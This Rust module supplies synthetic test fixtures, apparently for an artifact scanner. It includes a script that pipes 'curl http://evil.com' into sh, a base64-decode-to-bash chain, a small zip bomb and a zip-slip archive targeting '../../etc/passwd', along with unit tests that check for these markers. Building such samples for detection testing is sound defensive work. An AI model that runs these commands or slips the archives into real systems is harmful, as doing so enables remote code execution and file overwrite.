//! Safe synthetic artifact fixtures for tests.

use serde_json::{Value, json};

/// Returns a benign shell script fixture.
#[must_use]
pub fn benign_shell_script() -> Vec<u8> {
    b"#!/bin/bash\necho hello\n".to_vec()
}

/// Returns a safe synthetic shell script containing a malicious-looking pattern.
#[must_use]
pub fn malicious_shell_script() -> Vec<u8> {
    b"#!/bin/bash\ncurl http://evil.com | sh\n".to_vec()
}

/// Returns a safe obfuscated shell script fixture with a base64 decode chain.
#[must_use]
pub fn obfuscated_shell_script() -> Vec<u8> {
    b"#!/bin/bash\nprintf 'ZWNobyBoZWxsbwo=' | base64 -d | bash\n".to_vec()
}

/// Returns an empty file fixture.
#[must_use]
pub fn empty_file() -> Vec<u8> {
    Vec::new()
}

/// Returns deterministic pseudo-random bytes of `size` bytes.
#[must_use]
pub fn random_bytes(size: usize) -> Vec<u8> {
    let mut state = 0x9E37_79B9_7F4A_7C15_u64;
    let mut bytes = Vec::with_capacity(size);
    for _ in 0..size {
        state ^= state << 7;
        state ^= state >> 9;
        state ^= state << 8;
        bytes.push(state.to_le_bytes()[0]);
    }
    bytes
}

/// Returns a bounded synthetic archive bomb fixture.
#[must_use]
pub fn zip_bomb() -> Vec<u8> {
    vec![
        80, 75, 3, 4, 20, 0, 0, 0, 8, 0, 111, 21, 208, 92, 128, 6, 155, 160, 79, 0, 0, 0, 0, 0, 1,
        0, 8, 0, 0, 0, 98, 111, 109, 98, 46, 116, 120, 116, 237, 193, 129, 0, 0, 0, 0, 128, 32,
        182, 253, 165, 22, 169, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 106, 80, 75, 1, 2, 20, 3, 20, 0, 0, 0,
        8, 0, 111, 21, 208, 92, 128, 6, 155, 160, 79, 0, 0, 0, 0, 0, 1, 0, 8, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 128, 1, 0, 0, 0, 0, 98, 111, 109, 98, 46, 116, 120, 116, 80, 75, 5, 6, 0, 0, 0,
        0, 1, 0, 1, 0, 54, 0, 0, 0, 117, 0, 0, 0, 0, 0,
    ]
}

/// Returns a zip-slip archive fixture with a traversal entry name.
#[must_use]
pub fn path_traversal_zip() -> Vec<u8> {
    vec![
        80, 75, 3, 4, 20, 0, 0, 0, 8, 0, 111, 21, 208, 92, 49, 30, 44, 48, 27, 0, 0, 0, 32, 0, 0,
        0, 16, 0, 0, 0, 46, 46, 47, 46, 46, 47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100, 43,
        202, 207, 47, 177, 170, 176, 50, 176, 50, 176, 42, 2, 49, 245, 33, 100, 82, 102, 158, 126,
        82, 98, 113, 6, 23, 0, 80, 75, 1, 2, 20, 3, 20, 0, 0, 0, 8, 0, 111, 21, 208, 92, 49, 30,
        44, 48, 27, 0, 0, 0, 32, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 1, 0, 0, 0, 0,
        46, 46, 47, 46, 46, 47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100, 80, 75, 5, 6, 0, 0,
        0, 0, 1, 0, 1, 0, 62, 0, 0, 0, 73, 0, 0, 0, 0, 0,
    ]
}

/// Returns a minimal ELF-like header fixture; it is not executable.
#[must_use]
pub fn elf_binary() -> Vec<u8> {
    vec![0x7f, b'E', b'L', b'F', 2, 1, 1, 0]
}

/// Returns a minimal receipt-shaped JSON object for assertion tests.
#[must_use]
pub fn json_receipt_stub() -> Value {
    json!({
        "schema_version": "0.1.0",
        "artifact": { "sha256": "00" },
        "verdict": "allow",
        "findings": [],
        "transport": { "source": "synthetic" }
    })
}

#[cfg(test)]
mod tests {
    use super::{
        benign_shell_script, elf_binary, empty_file, json_receipt_stub, malicious_shell_script,
        obfuscated_shell_script, path_traversal_zip, random_bytes, zip_bomb,
    };

    #[test]
    fn shell_fixtures_have_expected_markers() {
        assert!(benign_shell_script().starts_with(b"#!/bin/bash"));
        assert!(
            malicious_shell_script()
                .windows(b"evil.com".len())
                .any(|window| window == b"evil.com")
        );
        assert!(
            obfuscated_shell_script()
                .windows(b"base64 -d".len())
                .any(|window| window == b"base64 -d")
        );
    }

    #[test]
    fn binary_and_archive_fixtures_have_expected_markers() {
        assert!(empty_file().is_empty());
        assert_eq!(random_bytes(32).len(), 32);
        assert!(zip_bomb().starts_with(b"PK\x03\x04"));
        assert!(
            path_traversal_zip()
                .windows(b"../../etc/passwd".len())
                .any(|window| window == b"../../etc/passwd")
        );
        assert!(elf_binary().starts_with(b"\x7fELF"));
    }

    #[test]
    fn receipt_stub_has_required_fields() {
        let receipt = json_receipt_stub();
        assert!(receipt.get("schema_version").is_some());
        assert!(receipt.get("artifact").is_some());
        assert!(receipt.get("verdict").is_some());
        assert!(receipt.get("findings").is_some());
    }
}
